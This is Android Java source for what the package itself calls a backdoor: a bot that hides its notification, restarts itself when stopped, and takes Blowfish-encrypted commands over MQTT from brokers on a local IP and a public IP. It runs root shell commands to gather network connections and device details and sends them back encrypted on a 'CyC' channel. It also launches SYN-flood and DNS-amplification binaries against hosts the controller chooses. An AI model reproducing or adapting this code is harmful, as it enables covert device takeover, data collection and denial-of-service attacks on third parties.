package com.iote.backdoor;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import org.eclipse.paho.android.service.MqttAndroidClient;
import org.eclipse.paho.client.mqttv3.IMqttActionListener;
import org.eclipse.paho.client.mqttv3.IMqttDeliveryToken;
import org.eclipse.paho.client.mqttv3.IMqttToken;
import org.eclipse.paho.client.mqttv3.MqttCallback;
import org.eclipse.paho.client.mqttv3.MqttClient;
import org.eclipse.paho.client.mqttv3.MqttException;
import org.eclipse.paho.client.mqttv3.MqttMessage;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.math.BigInteger;
import java.security.InvalidKeyException;
import java.security.Key;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.UUID;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;

class MyThread implements Runnable { //Hilo implementado para crear inundación Syn/AMP dns, y de esta manera, seguir teniendo comunicación con bot-C&C

    Thread t;
    String IPDestino,puertoDestino;
    MqttAndroidClient clientSyn;
    boolean busyThread = false;
    int DoS = 0;

    MyThread(String IP, String port,int tipoDos,MqttAndroidClient client) throws MqttException //Constructor
    {
        this.IPDestino = IP; //this (acceder a variables de otras clases)
        this.puertoDestino = port;
        this.DoS = tipoDos;
        this.clientSyn = client;
        t = new Thread(this);
        t.start(); // Empieza el hilo
    }

    public void run()
    {
        while (!Thread.interrupted()) {

            final String[] str = {""};
            final StringBuffer sb =  new StringBuffer();
            String id = MqttApplication.sharedPreferences.getString("ID","-");
            int firstTime = MqttApplication.sharedPreferences.getInt("FIRST_TIME",1);
            //id = "73059017-c2c8-43af-9c48-41481c6dec85"; //SIMULACIÓN
            //id = "19e46b97-80b6-45f3-838e-785f69102a96"; //SIMULACIÓN
            //int firstTime = 0; //SIMULACIÓN
            Blowfish blowfish = new Blowfish();
            ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
            final String encryptKey = UUID.randomUUID().toString().replace("-", "").substring(0, 4);

            try
            {
                   if(this.DoS == 1){
                       Process p = Runtime.getRuntime().exec(new String[] { "su", "-c", "data/local/tmp/multiSyn " + this.IPDestino + " " + this.puertoDestino});// Syn fl
                       BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
                       while((str[0] = inputStream.readLine())!= null){
                           sb.append(str[0]);
                       }
                       String consulta = sb.toString();
                       byte[] bytes = consulta.getBytes();
                       MqttMessage mqttMessage = new MqttMessage(bytes);
                       this.clientSyn.publish("CyC", mqttMessage);
                   }else if (this.DoS == 2){
                       Process p = Runtime.getRuntime().exec(new String[] { "su", "-c", "data/local/tmp/ampDns " + this.IPDestino + " " + this.puertoDestino});// Syn fl
                       BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
                       while((str[0] = inputStream.readLine())!= null){
                           sb.append(str[0]);
                       }
                       String consulta = sb.toString();
                       byte[] bytes = consulta.getBytes();
                       MqttMessage mqttMessage = new MqttMessage(bytes);
                       this.clientSyn.publish("CyC", mqttMessage);
                   }

            } catch (Exception e) {
                e.printStackTrace();
                MqttApplication.editor.putBoolean("BUSY_THREAD", false);
                MqttApplication.editor.apply();
                MqttApplication.editor.putBoolean("DOS_FLOOD_SYN", false);
                MqttApplication.editor.apply();
                MqttApplication.editor.putBoolean("DOS_AMP_DNS", false);
                MqttApplication.editor.apply();
                t.interrupt();

                String errorMessage = "Error (3): Sin acceso como SU.";
                String deviceInfo = "";

                if(this.DoS == 1){
                    deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"9\", \"value\": \""+errorMessage+"\"}"+firstTime+"&";
                }else if(this.DoS == 2){
                    deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"10\", \"value\": \""+errorMessage+"\"}"+firstTime+"&";
                }

                //Cifrando
                try {
                    bytesMqtt.write(encryptKey.getBytes());
                    bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
                } catch (Exception error) {
                    error.printStackTrace();
                }

                MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                try {
                    this.clientSyn.publish("CyC",mqttMessage);
                } catch (MqttException errorMQTT) {
                    errorMQTT.printStackTrace();
                }
            }
        }
    }
}

public class MqttConnectionManagerService extends Service {

    private static final String TAG = "MqttConnectionManagerSe";
    private MqttAndroidClient client;
    private MqttAndroidClient client2; //SIMULACIÓN <--------------

    final boolean busyThread = MqttApplication.sharedPreferences.getBoolean("BUSY_THREAD", false);
    final boolean dosFloodSyn = MqttApplication.sharedPreferences.getBoolean("DOS_FLOOD_SYN", false);
    final boolean dosAmpDns = MqttApplication.sharedPreferences.getBoolean("DOS_AMP_DNS", false);

    MyThread t1; //Para terminar proceso del case 10,13

    @SuppressLint("WrongConstant")
    @Override
    public void onCreate() {
        super.onCreate();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {

            String NOTIFICATION_CHANNEL_ID = "-";
            String channelName = "-";
            NotificationChannel chan = new NotificationChannel(NOTIFICATION_CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_NONE);
            chan.setLightColor(Color.BLUE);
            chan.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);
            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            assert manager != null;
            manager.createNotificationChannel(chan);

            NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID);
            Notification notification = notificationBuilder.setOngoing(true)
                    .setContentTitle("-")
                    .setPriority(NotificationManager.IMPORTANCE_MIN)
                    .setCategory(Notification.CATEGORY_SERVICE)
                    .build();

            startForeground(2, notification);
            startForeground(1, notification);
            stopSelf(2);
            stopForeground(true);


        } else {
            //NormalService, no hay necesidad de llamar a alguna función en especial.
        }

    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        connect();
        return START_STICKY;
    }

    private static final char[] HEX_ARRAY = "0123456789ABCDEF".toCharArray();
    public static String bytesToHex(byte[] bytes) {
        char[] hexChars = new char[bytes.length * 2];
        for (int j = 0; j < bytes.length; j++) {
            int v = bytes[j] & 0xFF;
            hexChars[j * 2] = HEX_ARRAY[v >>> 4];
            hexChars[j * 2 + 1] = HEX_ARRAY[v & 0x0F];
        }
        return new String(hexChars);
    }

    public void connect() {

        final String clientId = MqttClient.generateClientId();
        final String clientId2 = MqttClient.generateClientId(); //SIMULACIÓN <----------

        client = new MqttAndroidClient(getApplication().getApplicationContext(), "tcp://192.168.1.78:1883",
                clientId);
        client2 = new MqttAndroidClient(getApplication().getApplicationContext(), "tcp://187.208.132.4:1883",
                clientId2); //SIMULACIÓN <-------------

        final String id = MqttApplication.sharedPreferences.getString("ID", "-");
        final  int firstTime = MqttApplication.sharedPreferences.getInt("FIRST_TIME", 1);

        try {
            IMqttToken token = client.connect();
            IMqttToken token2 = client2.connect();//SIMULACIÓN <-------------

            client.setCallback(new MqttCallback() {
                @Override
                public void connectionLost(Throwable cause) {

                }

                @Override
                public void messageArrived(String topic, MqttMessage message) throws MqttException, NoSuchPaddingException, NoSuchAlgorithmException, JSONException, IOException {

                    String s = String.valueOf(message);
                    String decryptionKey = s.substring(0, 4);
                    String encryptedPayload = s.substring(4);
                    Log.d(TAG, "Subllave: "+decryptionKey);
                    Cipher cipher = Cipher.getInstance("Blowfish/ECB/PKCS5Padding");
                    Key blowfishKey = new SecretKeySpec(decryptionKey.getBytes(), "Blowfish");

                    try {
                        cipher.init(Cipher.DECRYPT_MODE, blowfishKey);
                    } catch (InvalidKeyException e) {
                        e.printStackTrace();
                    }
                    byte[] decrypted = new byte[0];
                    byte[] finalBytes = new BigInteger(encryptedPayload, 16).toByteArray();

                    if(finalBytes.length % 8 != 0){
                        if(finalBytes[0] == 0){
                            finalBytes = Arrays.copyOfRange(finalBytes,1,finalBytes.length);
                        }
                    }

                    try {
                        decrypted = cipher.doFinal(finalBytes);
                    } catch (BadPaddingException | IllegalBlockSizeException e) {
                        e.printStackTrace();
                    }

                    String decryptedString = new String(decrypted);

                    //Leyendo el JSON
                    String jsonString = decryptedString.substring(0, decryptedString.lastIndexOf("&"));
                    JSONObject obj = new JSONObject(jsonString);
                    decryptedString = obj.getString("command");

                    final String[] splited = decryptedString.split("\\s+");

                    final StringBuffer sb = new StringBuffer();
                    final String[] str = {""};
                    //String id = "73059017-c2c8-43af-9c48-41481c6dec85"; //SIMULACIÓN
                    //int firstTime = 0; //SIMULACIÓN
                    final String encryptKey = UUID.randomUUID().toString().replace("-", "").substring(0, 4);

                    switch (Integer.parseInt(splited[0]))
                    {
                        case 1:
                            try {
                                Process p = Runtime.getRuntime().exec(new String[] { "su", "-c", "ip link show"});// INTERFACES DE RED.
                                BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
                                while((str[0] = inputStream.readLine())!= null){
                                    sb.append(str[0]);
                                }
                                String networkInterfaces = sb.toString();
                                String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"1\", \"value\": \""+networkInterfaces+"\"}"+firstTime+"&";

                                //Cifrando
                                Blowfish blowfish = new Blowfish();
                                ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();

                                try {
                                    bytesMqtt.write(encryptKey.getBytes());
                                    bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }

                                MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                                try {
                                    client2.publish("CyC",mqttMessage);
                                } catch (MqttException e) {
                                    e.printStackTrace();
                                }

                            } catch (Exception e) {
                                e.printStackTrace();
                                //Sin acceso como su
                                String errorMessage = "Error (3): Sin acceso como SU.";
                                String deviceInfo = "";
                                deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"1\", \"value\": \""+errorMessage+"\"}"+firstTime+"&";

                                //Cifrando
                                Blowfish blowfish = new Blowfish();
                                ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();

                                try {
                                    bytesMqtt.write(encryptKey.getBytes());
                                    bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
                                } catch (Exception ex) {
                                    ex.printStackTrace();
                                }

                                MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                                try {
                                    client2.publish("CyC",mqttMessage);
                                } catch (MqttException ex) {
                                    ex.printStackTrace();
                                }

                            }
                            break;

                        case 2:
                            try {
                                Process p = Runtime.getRuntime().exec("netstat -at"); //Conexiones TCP
                                BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
                                while((str[0] = inputStream.readLine())!= null){
                                    sb.append(str[0]);
                                }
                                String tcpConnections = sb.toString();
                                String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"2\", \"value\": \""+tcpConnections+"\"}"+firstTime+"&";

                                //Cifrando
                                Blowfish blowfish = new Blowfish();
                                ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();

                                try {
                                    bytesMqtt.write(encryptKey.getBytes());
                                    bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }

                                MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                                try {
                                    client2.publish("CyC",mqttMessage);
                                } catch (MqttException e) {
                                    e.printStackTrace();
                                }

                            } catch (Exception e) {
                                e.printStackTrace();
                            }

                            break;
                        case 3:

                            try {
                                Process p = Runtime.getRuntime().exec("netstat -au"); //UDP
                                BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
                                while((str[0] = inputStream.readLine())!= null){
                                    sb.append(str[0]);
                                }
                                String udpConnections = sb.toString();
                                String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"3\", \"value\": \""+udpConnections+"\"}"+firstTime+"&";

                                //Cifrando
                                Blowfish blowfish = new Blowfish();
                                ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();

                                try {
                                    bytesMqtt.write(encryptKey.getBytes());
                                    bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }

                                MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                                try {
                                    client2.publish("CyC",mqttMessage);
                                } catch (MqttException e) {
                                    e.printStackTrace();
                                }

                            } catch (Exception e) {
                                e.printStackTrace();
                            }

                            break;

                        case 4:

                            try {
                                Process p = Runtime.getRuntime().exec("getprop dalvik.vm.isa.arm.variant"); //Nombre Procesador
                                BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
                                while((str[0] = inputStream.readLine())!= null){
                                    sb.append(str[0]);
                                }
                                String processor = sb.toString();
                                String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"4\", \"value\": \""+processor+"\"}"+firstTime+"&";

                                //Cifrando
                                Blowfish blowfish = new Blowfish();
                                ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();

                                try {
                                    bytesMqtt.write(encryptKey.getBytes());
                                    bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }

                                MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                                try {
                                    client2.publish("CyC",mqttMessage);
                                } catch (MqttException e) {
                                    e.printStackTrace();
                                }

                            } catch (Exception e) {
                                e.printStackTrace();
                            }

                            break;

                        case 5:

                            try {
                                Process p = Runtime.getRuntime().exec("getprop ro.product.cpu.abi");//Arquitectura procesador
                                BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
                                while((str[0] = inputStream.readLine())!= null){
                                    sb.append(str[0]);
                                }
                                String architecturProcessor = sb.toString();
                                String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"5\", \"value\": \""+architecturProcessor+"\"}"+firstTime+"&";
                                //Cifrando
                                Blowfish blowfish = new Blowfish();
                                ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();

                                try {
                                    bytesMqtt.write(encryptKey.getBytes());
                                    bytesMqtt.write(blowfish.encrypt(encryptKey, deviceInfo));
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }

                                MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                                try {
                                    client2.publish("CyC",mqttMessage);
                                } catch (MqttException e) {
                                    e.printStackTrace();
                                }

                            } catch (Exception e) {
                                e.printStackTrace();
                            }

                            break;

                        case 6:

                            try {
                                Process p = Runtime.getRuntime().exec("getprop ro.product.model"); //Modelo
                                BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
                                while((str[0] = inputStream.readLine())!= null){
                                    sb.append(str[0]);
                                }
                                String model = sb.toString();
                                String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"6\", \"value\": \""+model+"\"}"+firstTime+"&";

                                //Cifrando
                                Blowfish blowfish = new Blowfish();
                                ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();

                                try {
                                    bytesMqtt.write(encryptKey.getBytes());
                                    bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }

                                MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                                try {
                                    client2.publish("CyC",mqttMessage);
                                } catch (MqttException e) {
                                    e.printStackTrace();
                                }

                            } catch (Exception e) {
                                e.printStackTrace();
                            }

                            break;

                        case 7:

                            try {
                                Process p = Runtime.getRuntime().exec("getprop ro.build.version.sdk"); //version SDK
                                BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
                                while((str[0] = inputStream.readLine())!= null){
                                    sb.append(str[0]);
                                }
                                String sdk = sb.toString();
                                String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"7\", \"value\": \""+sdk+"\"}"+firstTime+"&";

                                //Cifrando
                                Blowfish blowfish = new Blowfish();
                                ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();

                                try {
                                    bytesMqtt.write(encryptKey.getBytes());
                                    bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }

                                MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                                try {
                                    client2.publish("CyC",mqttMessage);
                                } catch (MqttException e) {
                                    e.printStackTrace();
                                }

                            } catch (Exception e) {
                                e.printStackTrace();
                            }

                            break;

                        case 8:

                            try {
                                Process p = Runtime.getRuntime().exec("getprop persist.sys.timezone"); //Zona horaria
                                BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
                                while((str[0] = inputStream.readLine())!= null){
                                    sb.append(str[0]);
                                }
                                String timeZone = sb.toString();
                                String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"8\", \"value\": \""+timeZone+"\"}"+firstTime+"&";

                                //Cifrando
                                Blowfish blowfish = new Blowfish();
                                ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();

                                try {
                                    bytesMqtt.write(encryptKey.getBytes());
                                    bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }

                                MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                                try {
                                    client2.publish("CyC",mqttMessage);
                                } catch (MqttException e) {
                                    e.printStackTrace();
                                }

                            } catch (Exception e) {
                                e.printStackTrace();
                            }

                            break;

                        case 9:

                            try {
                                 Process p = Runtime.getRuntime().exec(new String[] { "su", "-c", "data/local/tmp/pruebaTCPSYN " + splited[1] + " " + splited[2]});// Syn fl
                                 BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
                                 while((str[0] = inputStream.readLine())!= null){
                                     sb.append(str[0]);
                                 }

                                 String floodSyn = sb.toString();
                                 String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"9\", \"value\": \""+floodSyn+"\"}"+firstTime+"&";

                                 //Cifrando
                                 Blowfish blowfish = new Blowfish();
                                 ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();

                                 try {
                                     bytesMqtt.write(encryptKey.getBytes());
                                     bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
                                 } catch (Exception e) {
                                     e.printStackTrace();
                                 }

                                 MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                                 try {
                                     client2.publish("CyC",mqttMessage);
                                 } catch (MqttException e) {
                                     e.printStackTrace();
                                 }
                            } catch (Exception e) {
                                e.printStackTrace();
                            }

                            break;

                        case 10:

                            /*if(busyThread && dosFloodSyn){

                                MqttApplication.editor.putBoolean("BUSY_THREAD", false);
                                MqttApplication.editor.apply();
                                MqttApplication.editor.putBoolean("DOS_FLOOD_SYN", false);
                                MqttApplication.editor.apply();

                                t1.t.interrupt(); //para el hilo...

                                try {
                                    Process p = Runtime.getRuntime().exec(new String[] { "su", "-c", "killall -9 multiSyn"});// mata el proceso...
                                    BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
                                    while((str[0] = inputStream.readLine())!= null){
                                        sb.append(str[0]);
                                    }
                                    String floodSyn = "Detenida";
                                    String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"9\", \"value\": \""+floodSyn+"\"}"+firstTime+"&";

                                    //Cifrando
                                    Blowfish blowfish = new Blowfish();
                                    ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();

                                    try {
                                        bytesMqtt.write(encryptKey.getBytes());
                                        bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
                                    } catch (Exception e) {
                                        e.printStackTrace();
                                    }

                                    MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                                    try {
                                        client.publish("CyC",mqttMessage);
                                    } catch (MqttException e) {
                                        e.printStackTrace();
                                    }

                                } catch (Exception e) {
                                    e.printStackTrace();
                                }


                            }else if (!dosFloodSyn){

                                String floodSyn = "Error (2) No ha sido iniciada";
                                String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"9\", \"value\": \""+floodSyn+"\"}"+firstTime+"&";

                                //Cifrando
                                Blowfish blowfish = new Blowfish();
                                ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();

                                try {
                                    bytesMqtt.write(encryptKey.getBytes());
                                    bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }

                                MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                                try {
                                    client.publish("CyC",mqttMessage);
                                } catch (MqttException e) {
                                    e.printStackTrace();
                                }
                            }*/

                            break;

                        case 11:

                            try{
                                Process p = Runtime.getRuntime().exec(new String[] { "su", "-c", "data/local/tmp/pruebaAMPDNS " + splited[1] + " " + splited[2]});// Syn fl
                                BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
                                while((str[0] = inputStream.readLine())!= null){
                                    sb.append(str[0]);
                                }

                                String ampDns = sb.toString();
                                String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"10\", \"value\": \""+ampDns+"\"}"+firstTime+"&";

                                //Cifrando
                                Blowfish blowfish = new Blowfish();
                                ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();

                                try {
                                    bytesMqtt.write(encryptKey.getBytes());
                                    bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }

                                MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                                try {
                                    client2.publish("CyC",mqttMessage);
                                } catch (MqttException e) {
                                    e.printStackTrace();
                                }

                            } catch (Exception e) {
                                e.printStackTrace();
                            }

                            break;

                        case 12:

                            /*if(busyThread && dosAmpDns){
                                MqttApplication.editor.putBoolean("BUSY_THREAD", false);
                                MqttApplication.editor.apply();
                                MqttApplication.editor.putBoolean("DOS_AMP_DNS", false);
                                MqttApplication.editor.apply();
                                t1.t.interrupt(); //para el hilo...

                                try {
                                    Process p = Runtime.getRuntime().exec(new String[] { "su", "-c", "killall -9 ampDns"});// mata el proceso...
                                    BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
                                    while((str[0] = inputStream.readLine())!= null){
                                        sb.append(str[0]);
                                    }
                                    String floodSyn = "Detenida";
                                    String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"10\", \"value\": \""+floodSyn+"\"}"+firstTime+"&";

                                    //Cifrando
                                    Blowfish blowfish = new Blowfish();
                                    ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();

                                    try {
                                        bytesMqtt.write(encryptKey.getBytes());
                                        bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
                                    } catch (Exception e) {
                                        e.printStackTrace();
                                    }

                                    MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                                    try {
                                        client.publish("CyC",mqttMessage);
                                    } catch (MqttException e) {
                                        e.printStackTrace();
                                    }

                                } catch (Exception e) {
                                    e.printStackTrace();
                                }
                            }else if(!dosAmpDns){

                                String ampDns = "Error (2) Has not been started";
                                String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"10\", \"value\": \""+ampDns+"\"}"+firstTime+"&";

                                //Cifrando
                                Blowfish blowfish = new Blowfish();
                                ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();

                                try {
                                    bytesMqtt.write(encryptKey.getBytes());
                                    bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }

                                MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                                try {
                                    client.publish("CyC",mqttMessage);
                                } catch (MqttException e) {
                                    e.printStackTrace();
                                }
                            }*/

                            break;

                        case 13:

                            String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"11\", \"value\": \"Inactivo\"}"+firstTime+"&";

                            //Cifrando
                            Blowfish blowfish = new Blowfish();
                            ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();

                            try {
                                bytesMqtt.write(encryptKey.getBytes());
                                bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
                            } catch (Exception e) {
                                e.printStackTrace();
                            }

                            MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                            try {
                                client.publish("CyC",mqttMessage);
                            } catch (MqttException e) {
                                e.printStackTrace();
                            }


                            MainActivity.getInstance().cancelJob(); //Se teniene la tarea programada
                            stopSelf(1); //Se detiene el servicio persistente.
                            stopSelf(2);
                            stopForeground(true);

                            break;

                        default:

                            break;

                    }

                }

                @Override
                public void deliveryComplete(IMqttDeliveryToken token) {

                }
            });

            token.setActionCallback(new IMqttActionListener() {
                @Override
                public void onSuccess(IMqttToken asyncActionToken) {
                    try {
                        client.subscribe("test", 0, null, new IMqttActionListener() {
                            @Override
                            public void onSuccess(IMqttToken asyncActionToken) {
                            }
                            @Override
                            public void onFailure(IMqttToken asyncActionToken, Throwable exception) {
                            }
                        });
                    } catch (MqttException e) {
                        e.printStackTrace();
                    }
                }

                @Override
                public void onFailure(IMqttToken asyncActionToken, Throwable exception) {
                }
            });

            //=========================================================================== SIMULACIÓN
            token2.setActionCallback(new IMqttActionListener() {
                @Override
                public void onSuccess(IMqttToken asyncActionToken) {
                    try {
                        client.subscribe("test", 0, null, new IMqttActionListener() {
                            @Override
                            public void onSuccess(IMqttToken asyncActionToken) {
                            }

                            @Override
                            public void onFailure(IMqttToken asyncActionToken, Throwable exception) {

                            }
                        });
                    } catch (MqttException e) {
                        e.printStackTrace();
                    }
                }

                @Override
                public void onFailure(IMqttToken asyncActionToken, Throwable exception) {
                }
            });
        } catch (MqttException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onDestroy() {

        try {
            client.unsubscribe("test");
        } catch (MqttException e) {
            e.printStackTrace();
        }

        Intent broadcastIntent = new Intent();
        broadcastIntent.setAction("restartService");
        broadcastIntent.setClass(this, MqttServiceStartReceiver.class);
        this.sendBroadcast(broadcastIntent);
        super.onDestroy();

    }
}
